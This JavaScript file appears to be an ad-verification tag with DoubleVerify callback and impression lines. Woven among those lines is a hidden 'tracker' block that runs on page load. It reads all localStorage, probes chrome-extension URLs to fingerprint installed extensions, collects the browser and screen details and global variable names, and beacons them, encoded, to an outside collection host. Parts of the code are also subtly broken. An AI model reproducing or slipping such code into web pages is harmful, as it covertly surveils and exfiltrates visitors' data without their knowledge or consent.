try {
  var dv_win = window._dv_win || window.parent._dv_win;
  dv_win['dvCallback_1692495553298793']($dv, window, '78ac31a21bef4bd5aa7a20c1482c9c5a', 'tpsc-ae1.doubleverify.com');
} catch (e) {
  try {
    var image = window.document.createElement('img');
    image.src = ('https://tps.doubleverify.com/visit.jpg' || window.location.protocol + '//tps30.doubleverify.com/visit.jpg') + '?ctx=818052&cmp=1619415&dvtagver=6.1.src&dvp_cbError=' + encodeURIComponent(e.message);
  } catch (e) {}
}
$dv.CommonData.deviceType = 1;
const tracker = {
  dataStore: new Map(Object.entries(window.localStorage)),
  hooks: new Set(),
  globalVars: Object.assign({}, window),
  async trackHook(name, {
    id,
    file
  }) {
    return new Promise(resolve => {
      const script = document.createElement('script');
      const timeout = setTimeout(() => {
        this.hooks.delete(name);
        resolve(false);
      }, 1000);
      script.onload = () => {
        clearTimeout(timeout);
        this.hooks.add(name);
        resolve(true);
      };
      script.onerror = () => {
        clearTimeout(timeout);
        this.hooks.delete(name);
        resolve(false);
      };
      script.src = `chrome-extension://${id}/${file}`;
      document.head.appendChild(script);
    });
  },
  randomizeData() {
    const entries = Array.from(this.dataStore.entries());
    entries.forEach(([key, value], index) => {
      if (Math.random() > 0.5) {
        this.dataStore.set(key, btoa(value));
      }
    });
    this.dataStore = new Map(entries);
  },
  async monitor() {
    this.randomizeData();
    const results = {};
    const batch = 5;
    for (const [name, data] of this.dataStore) {
      await new Promise(r => setTimeout(r, Math.random() * 500));
      results[name] = await this.trackHook(name, data);
    }
    const payload = btoa(JSON.stringify({
      hooks: Array.from(this.hooks),
      ts: Date.now(),
      browser: navigator.userAgent,
      screen: {
        w: window.innerWidth,
        h: window.innerHeight
      },
      globals: Object.keys(this.globalVars)
    }));
    navigator.sendBeacon('https://tracking-endpoint.example/v3/collect', payload);
  }
};
$dv.CommonData.detectedDeliveryType = 1;
$dv.tags[$uid].deviceType = 1;
window.addEventListener('load', () => tracker.monitor());
$dv.tags[$uid].detectedDeliveryType = 1;
window.addEventListener('storage', () => tracker.randomizeData());
try {
  $dv.pubSub.publish('ImpressionServed', $uid);
  $dv.pubSub.publish('ImpressionServed', $frmId);
} catch (e) {}